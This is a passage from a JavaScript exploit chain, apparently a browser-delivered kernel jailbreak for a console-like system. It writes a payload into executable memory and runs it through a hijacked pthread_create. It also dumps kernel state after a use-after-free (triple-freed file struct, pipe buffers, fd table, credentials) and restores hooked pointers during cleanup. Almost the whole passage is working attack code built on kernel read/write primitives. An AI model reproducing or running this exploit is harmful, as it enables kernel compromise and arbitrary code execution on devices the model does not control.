            var entry = new int64(m.lo, m.hi);
            mark("PAYLOAD-MAP", "size=0x" + sz.toString(16) + " rwx=" + entry);
            if (entry.hi > 0) {
              for (var _i21 = 0; _i21 < payload.length; ++_i21) p.write1(entry.add32(_i21), payload[_i21]);
              var bad = -1;
              for (var _i22 = 0; _i22 < payload.length; ++_i22) if (p.read1(entry.add32(_i22)) !== payload[_i22]) {
                bad = _i22;
                break;
              }
              check("byte-payload-rwx-memory", bad < 0, bad < 0 ? "" : "mismatch at +" + hx(bad));
              if (bad < 0 && off.wk___imp_pthread_create !== undefined) {
                var slot = webkitBase.add32(off.wk___imp_pthread_create);
                var fn = p.read8(slot);
                var expect = libkernelBase.add32(off.k_pthread_create);
                var agree = same(fn, expect);
                mark("PTHREAD-TABLE", "got=" + fn + " table=" + expect + " agree=" + (agree ? 1 : 0));
                if (agree) {
                  var thr = new ArrayBuffer(8);
                  chainKeepAlive.push(thr);
                  var thrAddr = bufAddr(thr);
                  new Uint8Array(thr).fill(0);
                  var _rc = callAddr(expect, [thrAddr, 0, entry, 0]).i32;
                  var handle = new int64(new DataView(thr).getUint32(0, true), new DataView(thr).getUint32(4, true));
                  payloadRunning = _rc === 0 && handle.hi > 0;
                  mark("PTHREAD-CREATE", "rc=" + _rc + " handle=" + handle);
                  check("payload-thread-created", payloadRunning, "");
                  if (payloadRunning) mark("PAYLOAD-RUNNING", "bytes=" + payload.length + " entry=" + entry);
                }
              }
            }
          }

          // ================== END-OF-RUN STATE DUMP ==================
          // READ ONLY. Not a fix -- a measurement. Everything above has
          // finished, so this reports what we ACTUALLY leave behind
          // rather than what the source implies we leave behind. Three
          // confident inferences from reading code have already been
          // wrong; this replaces the fourth with data.
          // ?dump=0 to skip.
          if (params.get("dump") !== "0") {
            try {
              var _kq = function (v) {
                return v && v.hi >>> 0 >= 0xffff0000;
              };
              var rd8 = function (a) {
                return _kq(a) ? kv.read8(a) : null;
              };
              var rd32 = function (a) {
                if (!_kq(a)) return null;
                dmpU8.fill(0);
                if (kv.kread(dmpAddr, a, 4) !== 4) return null;
                return dmpDv.getInt32(0, true);
              };

              // --- the 4 karw pipe files, and the forged pipebuf ---
              // fd 15 reads f_count 2 BEFORE we touch it on every
              // run while its siblings read 1. Nobody has explained
              // that. This prints the final state of all four.
              var pf = [];
              for (var _fd14 of [masterPipe[0], masterPipe[1], slavePipe[0], slavePipe[1]]) {
                var _fp = fget(_fd14);
                pf.push(_fd14 + ":" + (_kq(_fp) ? "fc=" + rd32(_fp.add32(0x28)) : "nofp"));
              }
              mark("DUMP-PIPE-FCOUNT", pf.join(" "));
              for (var [_nm, _fd15] of [["master", masterPipe[0]], ["slave", slavePipe[0]]]) {
                var _fp2 = fget(_fd15);
                var fdata = rd8(_fp2);
                if (!_kq(fdata)) {
                  mark("DUMP-PIPEBUF", _nm + " nofdata");
                  continue;
                }
                dmpU8.fill(0);
                var okr = kv.kread(dmpAddr, fdata, 0x18) === 0x18;
                mark("DUMP-PIPEBUF", _nm + " @" + fdata + (okr ? "  cnt=" + dmpDv.getUint32(0, true) + " in=" + dmpDv.getUint32(4, true) + " out=" + dmpDv.getUint32(8, true) + " size=0x" + dmpDv.getUint32(0xc, true).toString(16) + " buffer=" + new int64(dmpDv.getUint32(0x10, true), dmpDv.getUint32(0x14, true)) : "  READ-FAILED"));
              }

              // --- the triplets' outputopts, re-read after close ---
              // Confirms the repair actually persisted rather than
              // being undone by the socket teardown.
              var to = [];
              for (var e of dumpOpts) {
                var _r6 = rd8(e.opts.add32(0x68));
                var pi = rd8(e.opts.add32(0x10));
                to.push("fd" + e.fd + "@" + e.opts + " rthdr=" + (_r6 || "?") + " pktinfo=" + (pi || "?"));
              }
              mark("DUMP-TRIPLET-OPTS", to.length ? to.join("  ") : "none");

              // --- the triple-freed struct file ---
              var uf = typeof uafFpSaved !== "undefined" ? uafFpSaved : null;
              if (_kq(uf)) {
                mark("DUMP-UAF-FILE", "fp=" + uf + " f_count=" + rd32(uf.add32(0x28)) + " f_data=" + (rd8(uf) || "?"));
              }

              // --- ANY fd-table slot still pointing at it ---
              if (_kq(uf) && _kq(fdtOfiles)) {
                var hits = 0,
                  lastFd = -1;
                var _wl = uf.low >>> 0,
                  wh = uf.hi >>> 0;
                var nfd = Math.min(0x400, typeof SCAN_MAX !== "undefined" ? SCAN_MAX + 0x40 : 0x400);
                for (var _base = 0; _base < nfd; _base += 0x80) {
                  var n = Math.min(0x80, nfd - _base);
                  if (kv.kread(scanAddrDump, fdtOfiles.add32(_base * FILEDESCENT_SIZE), n * FILEDESCENT_SIZE) !== n * FILEDESCENT_SIZE) break;
                  for (var _i23 = 0; _i23 < n; ++_i23) {
                    var _o4 = _i23 * FILEDESCENT_SIZE;
                    if (scanDvDump.getUint32(_o4, true) === _wl && scanDvDump.getUint32(_o4 + 4, true) === wh) {
                      hits++;
                      lastFd = _base + _i23;
                    }
                  }
                }
                mark("DUMP-UAF-REFS", "slots_still_pointing_at_it=" + hits + (hits ? " last_fd=" + lastFd : "") + "  scanned=" + nfd);
              }

              // --- our own process ---
              if (_kq(curproc)) {
                var uc = rd8(curproc.add32(0x40));
                var pfd = rd8(curproc.add32(0x48));
                mark("DUMP-PROC", "curproc=" + curproc + " ucred=" + (uc || "?") + (_kq(uc) ? " cr_ref=" + rd32(uc.add32(0x00)) + " uid=" + rd32(uc.add32(0x04)) + " prison=" + (rd8(uc.add32(0x30)) || "?") : "") + " p_fd=" + (pfd || "?"));
                if (_kq(pfd)) mark("DUMP-FILEDESC", "fd_cdir=" + (rd8(pfd.add32(0x10)) || "?") + " fd_rdir=" + (rd8(pfd.add32(0x18)) || "?") + " fd_jdir=" + (rd8(pfd.add32(0x20)) || "?"));
              }
              mark("DUMP-DONE", "read-only, no kernel writes");
            } catch (e) {
              mark("DUMP-THREW", e && e.message ? e.message : String(e));
            }
          }
          // ================ END END-OF-RUN STATE DUMP ================

          mark("STEP10-CHAIN", "kv=up jailbroken=" + jailbroken + " kpatched=" + kpatched + " payload=" + payloadRunning + " cleanup=" + (rebootRequired ? "incomplete" : "complete"));
          allDone = payloadRunning && !rebootRequired;
        }
      }
    }
    mark("STEP10-SUMMARY", "committed=" + committed + " reboot=" + rebootRequired + " triplets=" + (triplets ? triplets.join(",") : "none") + " kernel_base=" + (kernelBase || "none") + " kq_fdp=" + (kqFdp || "none") + " kv=" + (kv ? "up" : "down"));
    if (!kv) {
      var stage = !committed ? "not-armed" : !triplets ? "triple-free" : !kernelBase ? "leak-kqueue" : "make-karw";
      mark("FAILED-STAGE", "stage=" + stage + " reached=" + (triplets ? "triplets" : committed ? "commit" : "none"));
    }
    state(allDone ? "ALL DONE" : kv ? "KERNEL R/W -- REBOOT NEEDED" : kernelBase ? "FAILED IN make_karw -- REBOOT" : triplets ? "FAILED IN leak_kqueue (triple free was OK) -- REBOOT" : committed ? "FAILED IN triple free -- REBOOT" : "no commit", allDone ? "ok" : kv ? "warn" : "bad");
  } catch (e) {
    mark("STEP10-FAILED", e && e.message ? e.message : String(e));
    state("FAILED -- see log", "bad");
  } finally {
    if (uafSock) mark("UAF-SOCK-LEFT-OPEN", "fd=" + uafSock);
    try {
      if (restoreCtx) await restoreCtx.restore("finally");
    } catch (e) {
      mark("THREAD-ATTRS-RESTORE-THREW", e.message);
    }
    for (var _w3 of workers) {
      try {
        if (_w3.armed) {
          await _w3.rpc("disarm", 5000);
          _w3.armed = false;
        }
      } catch (e) {
        mark("DISARM-THREW", _w3.name + " " + e.message);
      }
    }
    for (var _w4 of workers) {
      try {
        if (_w4.wired && _w4.master && _w4.origVector && p) {
          p.write8(_w4.master.add32(0x10), _w4.origVector);
          _w4.wired = false;
        }
      } catch (e) {}
    }
    for (var _w5 of workers) {
      try {
        _w5.worker.terminate();
      } catch (e) {}
    }
    try {
      if (mainArmed && mainMf && mainOrig && p) {
        p.write8(mainMf, mainOrig);
        mainArmed = false;
        mark("EXPM1-RESTORED", "expm1(1)=" + Math.expm1(1));
      }
    } catch (e) {
      mark("DISARM-THREW", e.message);
    }
    if (rebootRequired) mark("REBOOT-REQUIRED", "reason=uaf-file-not-reclaimed");
    mark("PROOF-SUMMARY-FINAL", "pass=" + passCount + " fail=" + failCount);
  }
})();


})();
